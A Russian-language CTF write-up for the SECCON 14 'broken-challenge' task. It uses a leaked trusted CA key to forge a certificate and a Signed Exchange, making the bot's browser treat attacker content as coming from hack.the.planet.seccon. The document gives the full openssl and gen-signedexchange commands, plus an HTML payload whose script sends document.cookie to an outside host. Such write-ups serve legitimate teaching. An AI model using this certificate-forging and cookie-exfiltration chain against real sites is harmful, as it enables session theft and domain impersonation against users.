# broken-challenge
**SECCON 14**

Таск состоит из одного приложения, которое ждет от нас URL. Бот переходит на этот URL с кукой, где содержится флаг:
```
export const visit = async (url) => {
  ...
  try {
    await context.setCookie({
      name: "FLAG",
      value: flag.value,
      domain: "hack.the.planet.seccon",
      path: "/",
    });

    const page = await context.newPage();
    await page.goto(url, { timeout: 3_000 });
    await sleep(5_000);
    await page.close();
  } catch (e) {
    console.error(e);
  }

  await context.close();
  await browser.close();

  console.log(`end: ${url}`);
};
```
При этом у куки проставлен домен `hack.the.planet.seccon` (который не совпадает с доменом, где была расположена таска). Таким образом нам нужно добиться того, чтобы браузер бота думал что наш хост имеет домен `hack.the.planet.seccon`.

При изучении `Dockerfile` можно заметить следующую команду:
```
RUN mkdir -p /home/pptruser/.pki/nssdb \
    && certutil -A -d "sql:/home/pptruser/.pki/nssdb" -n "seccon" -t "CT,c,c" -i ./cert.crt
```
Команда создает директорию для базы данных Network Security Services (NSS) и добавляет туда доверенный сертификат. Данную БД будет использовать браузер бота, таким образом в браузере будет дополнительный доверенный сертификат, к которму мы можем получить доступ. Открытая часть дана вместе с исходниками `cert.crt`, а закрытую часть `cert.key` можно получить, обратившиьс на эндпоинт `/hint`. Теперь нужно разобраться, как использовать полученный сертификат.
Необходимо вспомнить или нагуглить про такую технологию как Signed Exchanges (SXG). Она позволяет веб-серверу предоставлять контент из любого источника, упаковывая полный HTTP-ответ в один файл и криптографически подписывая его с помощью закрытого ключа сервера-источника. Так, например, работают CDN: домен, где расположена статика может отличаться от оригинального домена веб-приложения и чтобы подтвердить оригинальность/легитимность статики на CDN сервере ее подписывают закрытым ключом оригинального сервера.

Однако, у нас нет закрытого ключа для `hack.the.planet.seccon`, а есть закрытый ключ доверенного сертификата. Это означает, что мы можем выпустить и подписать сертификат, действительный для `hack.the.planet.seccon`, а затем использовать этот сертификат для создания SXG ответа, который нам нужен. Приступим к реализации.

После того, как браузер проанализирует ответ SXG, он получит целевой домен, от которого, как утверждается, полчен ответ. Затем браузер считывает домен прилагаемого к ответу сертификата.
Домен сертификата должен передаваться по протоколу HTTPS и содержать цепочку сертификатов в кодировке CBOR, которая разрешает конкретному сертификату подписывать ответы SXG от имени оригинального домена.

Для начала создадим конфигурационный файл для нашего сертификата, который мы будем использовать для SXG подписи:
```
[req]
prompt = no                  # не запрашивать интерактивные подтверждения
distinguished_name = dn
req_extensions = v3_req

[dn]
CN = hack.the.planet.seccon

[v3_req]
basicConstraints = CA:FALSE                                        # это не корневой сертификат
keyUsage = digitalSignature                                        # сертификат можно использовать для цифровых подписей
subjectAltName = DNS:hack.the.planet.seccon,IP:10.200.200.2        # альтернативные имена (нужно указать свой IP)
1.3.6.1.4.1.11129.2.1.22 = ASN1:NULL                               # расширение для OCSP Must-Staple
```
Затем генерируем закрытый ключ на основе созданной конфигурации и создаем запрос на подпись нашего сертификата:
```
openssl ecparam -name prime256v1 -genkey -out exp_cert.key
openssl req -new -key exp_cert.key -out exp_cert.csr -config exp_cert.cnf
```
Подписываем наш сертификат сертификатами, которым доверяет бразуер бота:
```
openssl x509 -req -days 90 -in exp_cert.csr \
    -CA cert.crt -CAkey cert.key -CAcreateserial \
    -out exp_cert.crt \
    -extensions v3_req -extfile exp_cert.cnf -sha256
```
Далее, нам нужно создать OCSP запрос для нашего сертификата. Для этого сначала создадим файл в формате БД OpenSSL со следующим содержимым:
```
V 301231235959Z   $SERIAL  unknown /CN=hack.the.planet.seccon
```
где $SERIAL - серийный номер, выпущенного нами сертификата. Теперь создаем OCSP запрос:
```
openssl ocsp -issuer cert.crt -cert exp_cert.crt -reqout exp_cert.req
```
И на основе этого OCSP запроса создаем OCSP ответ, который будем использовать для создания `.cbor` файла:
```
openssl ocsp -index index.txt \
    -rsigner cert.crt -rkey cert.key \
    -CA cert.crt \
    -reqin exp_cert.req \
    -respout exp_cert.ocsp \
    -ndays 7 \
    -noverify
```
Сохраняем цепочку сертификатов нашего сервера в `.pem` файл:
```
cat exp_cert.crt cert.crt > exp_cert.pem
```
Упакуем нашу цепочку сертификатов и OCSP ответ в `.cbor` файл с помощью утилиты `gen-certurl` из [go/signedexchange](https://github.com/WICG/webpackage/blob/main/go/signedexchange/README.md?ref=blog.splitline.tw):
```
gen-certurl -pem exp_cert.pem -ocsp exp_cert.ocsp > exp_cert.cbor
```
И создадим `.sxg` файл с подписанным `index.html` с помощью `gen-signedexchange`:
```
gen-signedexchange \
  -uri https://hack.the.planet.seccon/ \
  -content index.html \
  -certificate exp_cert.crt \
  -privateKey exp_cert.key \
  -certUrl https://$IP/exp_cert.cbor \
  -validityUrl https://hack.the.planet.seccon/resource.validity.msg  \
  -o exploit.sxg
```
Сам `index.html` содержит CSRF для кражи кук:
```
<html>
    <body>
        <script>
          var xhr = new XMLHttpRequest();
          xhr.open("GET", "https://10.200.200.2/leak?cookie=" + encodeURIComponent(document.cookie), false);
          xhr.send();
        </script>
    </body>
</html>
```
Поднимаем сервер, который будет раздавать подписанную статику и отправляем ссылку на наш `exploit.sxg` файл боту. В данном случае ссылка, `https://10.200.200.2/exploit.sxg`.
Пример сервера: [server.py](https://github.com/andreika47/Quiet-CTF/blob/main/broken-challenge/solve/server.py)
Пример скрипта для генерации необходимых файлов: [gen-sxg.sh](https://github.com/andreika47/Quiet-CTF/blob/main/broken-challenge/solve/gen-sxg.sh)

#web #sxg #cookie